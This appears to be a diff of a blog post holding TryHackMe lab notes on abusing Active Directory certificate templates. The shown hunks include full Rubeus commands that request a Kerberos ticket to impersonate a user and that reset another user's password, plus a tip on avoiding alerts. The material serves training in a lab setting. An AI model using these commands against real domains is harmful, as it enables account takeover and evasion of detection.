@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-05-10-tryhackme-jr-penetrat
 author: 100007
 ---
 
-# TryHackMe: Jr. Penetration Tester (Supplements)
-
-**author:** Nathan Acks  
-**date:** 2022-05-10
-
 Today’s TryHackMe Jr. Penetration Tester “supplements”:
 
 - [TryHackMe: AD Certificate Templates](https://tryhackme.com/room/adcertificatetemplates)
@@ -68,12 +63,12 @@ Rubeus can be used to request a Kerberos ticket granting ticket using the certif
 
 ```
 Rubeus.exe asktgt /user:$USER `
- /enctype:aes256 `
- /certificate:$CERTIFICATE_FILE `
- /password:$CERTIFICATE_FILE_PASSWORD `
- /outfile:$TICKET_FILE `
- /domain:$DOMAIN `
- /dc:$DC_IP_ADDRESS
+                  /enctype:aes256 `
+                  /certificate:$CERTIFICATE_FILE `
+                  /password:$CERTIFICATE_FILE_PASSWORD `
+                  /outfile:$TICKET_FILE `
+                  /domain:$DOMAIN `
+                  /dc:$DC_IP_ADDRESS
 ```
 
 Here we explode the UPN of the user we’re going to impersonate between the `/user` and `/domain` flags; using `/enctype:aes256` will prevent some alerts from being generated. TryHackMe recommends using the same domain controller that the CA service is running on. Once we have the ticket (in `$TICKET_FILE`), we can feed it into our favorite tool for actual exploitation.
@@ -82,9 +77,9 @@ Change a user’s password with Rubeus:
 
 ```
 Rubeus.exe changepw /ticket:$TICKET_FILE `
- /new:$NEW_PASSWORD `
- /dc:$DC_IP_ADDRESS `
- /targetuser:$DOMAIN\$USER
+                    /new:$NEW_PASSWORD `
+                    /dc:$DC_IP_ADDRESS `
+                    /targetuser:$DOMAIN\$USER
 ```
 
 Use `runas` to open a command prompt as another user:
